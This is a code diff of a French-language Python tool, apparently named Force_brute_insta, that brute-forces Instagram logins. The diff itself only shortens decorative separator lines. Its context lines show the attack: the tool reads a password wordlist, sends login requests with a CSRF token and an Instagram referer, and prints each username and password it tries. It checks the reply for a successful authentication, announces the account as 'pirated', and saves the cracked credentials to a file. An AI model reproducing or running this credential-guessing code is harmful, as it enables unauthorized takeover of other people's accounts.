@@ -193,7 +193,7 @@ class Force_brute_insta(object):
             print("\033[1;97m║")
             _wordliste  = raw_input("\033[1;97m╚═\033[1;31m▶\033[38;5;245m Entrer l'emplacement de la wordliste \033[1;97m═╬══\033[1;91m► \033[1;96m" )
             print("\033[1;97m║")
-            print("\033[1;97m╬═══╬═══╬═══╬═══╬═══╬═══╬═══╬═══╬═══╬")        
+            print("\033[1;97m╬═══╬═══╬═══╬═══╬═══╬═══╬")        
         except:
             print("\033[1;91m[\033[1;93m+\033[1;91m]\033[1;97m Erreur inexpliquable")
             quitter()
@@ -236,8 +236,8 @@ class Force_brute_insta(object):
                 "Referer": "https://www.instagram.com/accounts/login/",
                 "x-csrftoken": _csrf_jeton
             })
-            #print(f"{utilisateur}:{pwd}\n╬═══╬═══╬═══╬═══╬═══╬═══╬═══╬═══╬═══╬")
-            print("\033[1;91m[\033[1;93m+\033[1;91m]\033[1;97m " + utilisateur + "\033[1;91m :\033[1;93m " + pwd + "\033[1;97m\n╬═══╬═══╬═══╬═══╬═══╬═══╬═══╬═══╬═══╬")
+            #print(f"{utilisateur}:{pwd}\n╬═══╬═══╬═══╬═══╬═══╬═══╬")
+            print("\033[1;91m[\033[1;93m+\033[1;91m]\033[1;97m " + utilisateur + "\033[1;91m :\033[1;93m " + pwd + "\033[1;97m\n╬═══╬═══╬═══╬═══╬═══╬═══╬")
             if "authenticated': true" in reqs.text:
                 print("\033[1;91m[\033[1;93m+\033[1;91m]\033[1;97m " + utilisateur + "\033[1;91m: \033[1;96m" + pwd + "\033[1;91m -->\033[1;97m Bien pirater")
                 with open("faxelm.txt", "a") as saves:
